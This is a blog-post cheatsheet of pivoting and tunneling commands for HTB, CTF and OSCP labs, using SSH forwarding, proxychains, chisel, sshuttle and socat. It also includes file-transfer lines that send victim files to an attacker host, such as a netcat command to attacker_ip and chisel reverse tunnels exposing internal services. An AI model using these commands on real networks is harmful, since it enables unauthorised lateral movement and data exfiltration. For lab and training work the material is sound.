---
layout: post
title: "Port Forwarding & Pivoting Cheatsheet"
subtitle: "Quick notes for HTB, CTFs, tunneling, data exfiltration and exposing internal services"
tags: [pivoting, tunneling, port-forwarding, chisel, hacking]
---

A compact cheatsheet I use during HTB/CTFs to quickly forward ports, exfiltrate files, expose internal services, or pivot inside a network.

---

# 1. BASIC PORT FORWARDING (SSH)

### Forward local port → Remote service
```

ssh -L 8080:127.0.0.1:80 user@target

```
Access remote port 80 through:  `http://localhost:8080`

### Forward remote port → Your local machine
```

ssh -R 4444:localhost:22 user@target

```
Remote host can access your SSH on port 4444.

---

# 2. REMOTE PORT FORWARDING (RPF) 

### When you have shell but no inbound access

Use SSH from victim → your machine:
```

ssh -R 9001:127.0.0.1:3306 youruser@yourIP

```
Now `yourIP:9001` gives access to victim’s MySQL.

---

# 3. SOCKS PROXY (DYNAMIC FORWARDING)

### Create SOCKS proxy via SSH
```

ssh -D 1080 user@target

```

### Use it (proxychains)
Add to `/etc/proxychains.conf`:
```

socks5 127.0.0.1 1080

```

Run tools:
```

proxychains nmap -sT -Pn 10.10.10.0/24
proxychains firefox

```

---

# 4. CHISEL (client ↔ server reverse tunneling)

Download: https://github.com/jpillora/chisel

---

## **CHISEL – Local Port Forwarding**
### Attacker (start server)
```

chisel server -p 8000 --reverse

```

### Victim
```

chisel client attacker_ip:8000 R:8001:127.0.0.1:22

```

Now your machine exposes victim’s SSH at:
```

localhost:8001

```

---

## **CHISEL – SOCKS Proxy**
### Attacker:
```

chisel server -p 8000 --reverse

```

### Victim:
```

chisel client YOURIP:8000 R:socks

```

Proxy appears on attacker:
```

127.0.0.1:1080 (default)

```

Use with proxychains:
```

socks5 127.0.0.1 1080

```

---

# 5. [SSHUTTLE](https://github.com/sshuttle/sshuttle) (EASY NETWORK PIVOTING)

When you have SSH access. 
```

sshuttle -r user@target 10.10.0.0/24

```

You can now access the internal network **as if you were inside**.

---

# 6. SOCAT – UNIVERSAL PORT FORWARDER

Install:
```

apt install socat

```

### Reverse port forward
```

socat tcp-listen:8001,reuseaddr,fork tcp:127.0.0.1:22

```

### Forward internal HTTP outward
```

socat TCP4-LISTEN:8081,fork TCP4:127.0.0.1:80

```

---

# 7. QUICK FILE EXFILTRATION (victim → attacker)

### Python HTTP server (attacker)
```

python3 -m http.server 8000

```

### Victim:
```

curl [http://yourIP:8000/file](http://yourIP:8000/file)
wget [http://yourIP:8000/file](http://yourIP:8000/file)

```

---

# 8. Pull files FROM victim
### Victim hosts a temp web server:
```

python3 -m http.server 9999

```

### Attacker:
```

wget [http://victimIP:9999/sensitive.file](http://victimIP:9999/sensitive.file)

```

---

# 9. Transfer files in blind shells (netcat)

### Attacker (listen):
```

nc -lvnp 9001 > file.out

```

### Victim (send):
```

nc attacker_ip 9001 < file.txt

```

---

# 10. EXPOSE INTERNAL SERVICES (pivot inside HTB)

### Example: internal Jenkins on target only
Victim:
```

chisel client attacker_ip:8000 R:8080:127.0.0.1:8080

```

Attacker:
```

[http://localhost:8080](http://localhost:8080)

```

---

# 11. Enumerating internal network through pivot

With SOCKS (chisel or SSH):
```

proxychains nmap -sT -Pn 10.10.10.0/24
proxychains feroxbuster -u [http://10.10.10.20:8080](http://10.10.10.20:8080)
proxychains smbclient -L 10.10.10.5

```

---

# Final Notes

This cheat sheet covers:
- SSH forwarding  
- Socks proxies  
- Chisel pivoting  
- Socat universal tunnels  
- File exfiltration scenes  
- Internal network exploration (pivoting)  

Useful for HTB, OSCP, and any CTF with lateral movement.

---
